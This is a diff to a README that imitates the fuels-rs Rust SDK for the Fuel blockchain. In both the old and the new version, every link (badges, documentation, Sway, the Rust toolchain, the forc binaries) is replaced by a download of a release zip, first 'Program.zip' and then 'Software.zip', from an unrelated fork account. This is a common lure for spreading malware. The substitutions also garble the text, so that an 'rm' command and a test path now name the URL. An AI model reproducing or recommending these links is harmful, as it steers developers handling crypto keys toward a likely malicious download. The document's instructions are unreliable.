@@ -1,13 +1,13 @@
 # fuels-rs
 
-[![build](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
-[![https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
-[![docs](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
-[![discord](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip%20on-discord-orange?&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
+[![build](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)
+[![https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)
+[![docs](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)
+[![discord](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip%20on-discord-orange?&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)
 
 Rust SDK for Fuel. It can be used for a variety of things, including but not limited to:
 
-- Compiling, deploying, and testing [Sway](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip) contracts;
+- Compiling, deploying, and testing [Sway](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip) contracts;
 - Launching a local Fuel network;
 - Crafting and signing transactions with hand-crafted scripts or contract calls;
 - Generating type-safe Rust bindings of contract methods;
@@ -15,7 +15,7 @@ Rust SDK for Fuel. It can be used for a variety of things, including but not lim
 
 ## Documentation
 
-See [the `fuels-rs` book](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip)
+See [the `fuels-rs` book](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -33,8 +33,8 @@ See [the `fuels-rs` book](https://github.com/harbox11/fuels-rs/releases/download
 
 ### What dependencies do I need?
 
-- [The latest `stable` Rust toolchain](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip);
-- [`forc` and `fuel-core` binaries](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip).
+- [The latest `stable` Rust toolchain](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip);
+- [`forc` and `fuel-core` binaries](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip).
 
 ### How can I run the SDK tests?
 
@@ -50,7 +50,7 @@ Then you can run the SDK tests with:
 cargo test
 ```
 
-You can also run specific tests. The following example will run all integration tests in `https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip` whose names contain `in_vector` and show their outputs:
+You can also run specific tests. The following example will run all integration tests in `https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip` whose names contain `in_vector` and show their outputs:
 
 ```shell
 cargo test --test types in_vector -- --show-output
@@ -72,14 +72,14 @@ Before doing anything else, try all these commands:
 
 ```shell
 cargo clean
-rm https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip
+rm https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip
 forc build --path packages/fuels
 cargo test
 ```
 
 ### Why is the prefix `fuels` and not `fuel`?
 
-In order to make the SDK for Fuel feel familiar with those coming from the [https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip](https://github.com/harbox11/fuels-rs/releases/download/v1.0/Program.zip) ecosystem, this project opted for an `s` at the end. The `fuels-*` family of SDKs is inspired by The Ethers Project.
+In order to make the SDK for Fuel feel familiar with those coming from the [https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip) ecosystem, this project opted for an `s` at the end. The `fuels-*` family of SDKs is inspired by The Ethers Project.
 
 ### How can I run the docs locally?
 
